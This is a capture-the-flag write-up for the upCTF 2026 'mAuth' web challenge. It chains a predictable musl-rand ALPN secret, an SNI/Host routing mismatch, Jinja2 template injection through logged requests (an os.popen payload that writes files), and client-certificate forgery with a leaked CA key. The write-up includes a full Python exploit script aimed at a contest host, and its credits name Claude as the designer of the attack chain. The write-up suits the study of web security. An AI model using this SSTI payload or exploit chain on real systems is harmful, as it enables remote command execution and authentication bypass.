# mAuth — upCTF 2026 Writeup
**Category:** Web | **Points:** 100 | **Solves:** ~25

> `upCTF{n3v3r_m4k3_youuuur_0wn_mtls_MD6yvu9mFbJ282045c14}`

---

## Challenge Description

> mmmmmmmmmmmmmmmmm  
> Note: Do not verify the server's cert as it is self signed

The name **mAuth** and the repeated "m"s hint at **mutual TLS (mTLS)**.

---

## Architecture (from source zip)

All three services run in a **single Alpine Linux container** via supervisord:

```
Internet → [C TLS Proxy :443]
                ├── → [public-app Flask :5000]  (has the flag)
                └── → [admin-app Flask :5001]   (has SSTI via /logs)
```

**Key files:**
- `proxy/proxy.c` — Custom C TLS proxy (the gatekeeper)
- `public-app/app.py` — Serves the flag behind `X-Proxy-Authenticated: true`
- `admin-app/app.py` — Renders logs as Jinja2 template (SSTI!)
- `certs/ca.key` + `certs/ca.pem` — **CA private key leaked in zip!**

---

## Vulnerability Chain (4 Steps)

### Step 1 — Crack the Time-Based ALPN Secret

The proxy blocks ALL connections unless the client sends a specific ALPN protocol string:

```c
// proxy.c - generate_random_alpn()
static void generate_random_alpn(char *output, size_t outlen) {
    time_t now = time(NULL);
    time_t window = now / 300;       // 5-minute window
    srand((unsigned int)window);
    int r1 = rand();
    int r2 = rand();
    int r3 = rand();
    snprintf(output, outlen, "ctf-%08x-%08x-%08x", r1, r2, r3);
}
```

**Critical bugs in computing this:**

1. **Wrong libc**: The container runs Alpine Linux which uses **musl libc**, not glibc. Their `rand()` implementations are completely different:
   ```python
   # musl rand() (correct):
   seed = (seed - 1)  # srand sets seed = s - 1
   seed = (6364136223846793005 * seed + 1) & 0xFFFFFFFFFFFFFFFF
   return seed >> 33
   ```

2. **Argument evaluation order**: C compilers evaluate pre-assigned variables left-to-right (`r1, r2, r3`), unlike inline `rand(), rand(), rand()` which is right-to-left on Alpine gcc. Always use assigned variables to test.

3. **Clock skew**: The server window may differ by ±1 from local time — send multiple windows.

**Python exploit:**
```python
def gen_alpn(w):
    s = w - 1
    vals = []
    for _ in range(3):
        s = (6364136223846793005 * s + 1) & 0xFFFFFFFFFFFFFFFF
        vals.append(s >> 33)
    return f"ctf-{vals[0]:08x}-{vals[1]:08x}-{vals[2]:08x}"

base = int(time.time()) // 300
alpns = [gen_alpn(base + d) for d in [-2, -1, 0, 1]]
```

---

### Step 2 — SNI / Host Header Mismatch → Access Admin App

The proxy uses **SNI** for access control but **Host header** for routing:

```c
// Access check uses SNI:
if (strcmp(state->sni, "challenge.com") == 0) {
    return 1;  // ALLOWED - no cert needed!
}

// Routing uses Host header:
if (strcmp(host_header, "admin.challenge.com") == 0) {
    backend_host = ADMIN_APP_HOST;  // → admin-app:5001
}
```

So with `SNI=challenge.com` + `Host: admin.challenge.com` we reach the admin app **without any client certificate**.

---

### Step 3 — SSTI via Log Injection

**public-app** logs all requests to `/tmp/app.log`.  
**admin-app** `/logs` renders the log file as a Jinja2 template:

```python
# admin-app/app.py
@app.get('/logs')
def logs():
    with open('/tmp/app.log', 'r') as f:
        log_content = f.read()
    return render_template_string(log_content)  # ← SSTI!
```

**Inject a Jinja2 payload** via POST to public-app (it gets logged), then trigger it by hitting `/logs` on admin-app via the SNI/Host mismatch:

```python
# Payload: write our forged cert to shared volume
cert_b64 = base64.b64encode(open("client.crt").read().encode()).decode()
cmd = f"echo {cert_b64}|base64 -d>/app/certs/admin.cert"
payload = "{{config.__class__.__init__.__globals__['os'].popen('" + cmd + "').read()}}"
```

---

### Step 4 — Forge Client Cert → Get Flag

Since `certs/ca.key` is **leaked in the zip**, we sign our own client certificate:

```bash
openssl genrsa -out client.key 2048
openssl req -new -key client.key -out client.csr -subj "/CN=admin/O=CTF"
openssl x509 -req -in client.csr -CA certs/ca.pem -CAkey certs/ca.key \
  -CAcreateserial -out client.crt -days 365 -sha256
```

The proxy validates the client cert by **exact PEM byte comparison** against `/app/certs/admin.cert`. Since we wrote our cert there via SSTI, it matches — and the proxy injects `X-Proxy-Authenticated: true` into the request to public-app, which returns the flag.

---

## Full Exploit

```python
#!/usr/bin/env python3
import ssl, socket, time, base64, re

TARGET_HOST = "46.225.117.62"
TARGET_PORT = 30013
CLIENT_CERT = "client.crt"
CLIENT_KEY  = "client.key"

def gen_alpn(w):
    s = w - 1
    vals = []
    for _ in range(3):
        s = (6364136223846793005 * s + 1) & 0xFFFFFFFFFFFFFFFF
        vals.append(s >> 33)
    return f"ctf-{vals[0]:08x}-{vals[1]:08x}-{vals[2]:08x}"

def req(sni, http, with_cert=False):
    base = int(time.time()) // 300
    alpns = [gen_alpn(base + d) for d in [-2, -1, 0, 1]]
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(alpns)
    if with_cert:
        ctx.load_cert_chain(CLIENT_CERT, CLIENT_KEY)
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)
    s = ctx.wrap_socket(sock, server_hostname=sni)
    s.sendall(http.encode())
    r = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            r += c
    except: pass
    s.close()
    return r.decode(errors="replace")

# Step 1: Inject SSTI payload into logs via POST to public-app
cert_b64 = base64.b64encode(open(CLIENT_CERT).read().encode()).decode()
cmd = f"echo {cert_b64}|base64 -d>/app/certs/admin.cert"
payload = "{{config.__class__.__init__.__globals__['os'].popen('" + cmd + "').read()}}"
req("challenge.com",
    f"POST /pwn HTTP/1.1\r\nHost: challenge.com\r\n"
    f"Content-Type: text/plain\r\nContent-Length: {len(payload)}\r\n"
    f"Connection: close\r\n\r\n{payload}")

# Step 2: Trigger SSTI via SNI=challenge.com + Host=admin.challenge.com
req("challenge.com",
    "GET /logs HTTP/1.1\r\nHost: admin.challenge.com\r\nConnection: close\r\n\r\n")

time.sleep(2)

# Step 3: Get flag with our forged client cert
r = req("challenge.com",
    "GET /flag HTTP/1.1\r\nHost: challenge.com\r\nConnection: close\r\n\r\n",
    with_cert=True)

flags = re.findall(r'upCTF\{[^}]+\}', r)
print(f"FLAG: {flags[0]}" if flags else r)
```

---

## What Made This Hard

| Problem | Root Cause | Fix |
|---------|-----------|-----|
| ALPN always wrong | Used glibc `rand()` instead of musl | Implement musl LCG: `6364136223846793005 * seed + 1` |
| rand() order wrong | Tested with inline `rand(),rand(),rand()` (right-to-left eval) | Proxy uses pre-assigned `r1,r2,r3` → left-to-right |
| Clock skew | Server window ≠ local window | Send ±2 windows simultaneously |

---

## Credit

- **Attack chain design:** Claude (Anthropic)  
- **musl libc rand() increment fix (+1 not +1442695040888963407):** Friend's suggestion (Vivek's CTF friend)  
- **Key realization (arg eval order):** Docker testing confirmed `assigned` vs `inline` differ